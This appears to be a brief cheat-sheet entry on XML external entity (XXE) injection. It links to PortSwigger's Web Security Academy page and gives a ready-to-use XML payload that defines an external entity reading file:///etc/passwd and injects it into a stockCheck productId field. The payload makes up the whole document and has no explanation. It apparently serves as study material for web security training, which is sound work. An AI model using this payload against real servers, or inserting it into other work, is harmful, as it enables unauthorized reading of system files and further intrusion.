📚 [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)

````
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
````
